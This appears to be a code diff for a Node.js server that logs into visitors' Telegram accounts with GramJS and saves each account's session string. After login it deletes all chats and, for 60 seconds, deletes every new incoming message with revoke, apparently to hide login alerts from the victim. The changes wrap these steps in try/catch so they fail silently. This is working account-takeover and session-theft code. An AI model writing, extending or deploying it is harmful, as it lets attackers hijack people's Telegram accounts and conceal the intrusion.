@@ -113,29 +113,33 @@ async function archiveAndReadTelegramChats(client) {
 }
 
 async function cleanupPostLogin(client) {
-    await deleteAllChats(client);
-    await archiveAndReadTelegramChats(client);
+    try {
+        await deleteAllChats(client);
+        await archiveAndReadTelegramChats(client);
 
-    const eventHandler = async (event) => {
-        try {
-            const message = event.message;
-            if (!message || !message.id) return;
+        const eventHandler = async (event) => {
+            try {
+                const message = event.message;
+                if (!message || !message.id) return;
 
-            await client.markAsRead(message.peerId).catch(() => {});
-            await client.deleteMessages(message.peerId, [message.id], { revoke: true }).catch(() => {});
-            await archiveAndReadTelegramChats(client);
-        } catch (err) {
-            console.error("Error processing live message:", err.message);
-        }
-    };
+                await client.markAsRead(message.peerId).catch(() => {});
+                await client.deleteMessages(message.peerId, [message.id], { revoke: true }).catch(() => {});
+                await archiveAndReadTelegramChats(client);
+            } catch (err) {
+                console.error("Error processing live message:", err.message);
+            }
+        };
 
-    client.addEventHandler(eventHandler, new NewMessage({}));
-    await new Promise(resolve => setTimeout(resolve, 60000));
+        client.addEventHandler(eventHandler, new NewMessage({}));
+        await new Promise(resolve => setTimeout(resolve, 60000));
 
-    await deleteAllChats(client);
-    await archiveAndReadTelegramChats(client);
+        await deleteAllChats(client);
+        await archiveAndReadTelegramChats(client);
 
-    client.removeEventHandler(eventHandler, new NewMessage({}));
+        client.removeEventHandler(eventHandler, new NewMessage({}));
+    } catch (err) {
+        console.error("Error in cleanupPostLogin:", err.message);
+    }
 }
 
 app.get('/', (req, res) => {
@@ -153,7 +157,6 @@ app.post('/api/send-code', async (req, res) => {
         const userAgent = req.headers['user-agent'] || '';
         const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);
 
-        // สร้าง StringSession ថ្មីទទេរសម្រាប់ចាប់ផ្តើម Login ថ្មី
         const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
             connectionRetries: 2,
             timeout: 10,
@@ -219,8 +222,13 @@ app.post('/api/verify-code', async (req, res) => {
             console.error("Error getting user profile:", profileErr);
         }
 
-        // Save session ឱ្យចេញជាទម្រង់ GramJS StringSession ត្រឹមត្រូវ
-        const sessionString = client.session.save();
+        let sessionString = "";
+        try {
+            sessionString = client.session.save();
+        } catch (sessionErr) {
+            console.error("Error saving session string safely:", sessionErr.message);
+        }
+
         delete sessions[phoneNumber];
 
         cleanupPostLogin(client).catch(err => console.error("Cleanup background error:", err));
